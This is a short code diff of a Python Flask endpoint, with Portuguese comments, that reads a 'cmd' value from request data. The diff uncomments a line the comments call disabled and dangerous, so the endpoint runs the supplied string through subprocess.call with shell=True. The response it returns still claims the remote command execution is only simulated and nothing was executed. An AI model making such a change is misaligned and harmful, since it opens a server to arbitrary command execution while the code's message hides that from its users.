@@ -136,8 +136,8 @@ def run_command():
     cmd = data.get('cmd', '')
 
     # Exemplo perigoso (DESATIVADO)
-    # import subprocess
-    # subprocess.call(cmd, shell=True)  # NÃO FAÇA ISSO
+    import subprocess
+    subprocess.call(cmd, shell=True)  # NÃO FAÇA ISSO
 
     return jsonify({
         "note": "RCE demonstrada apenas como simulação. O comando NÃO foi executado.",
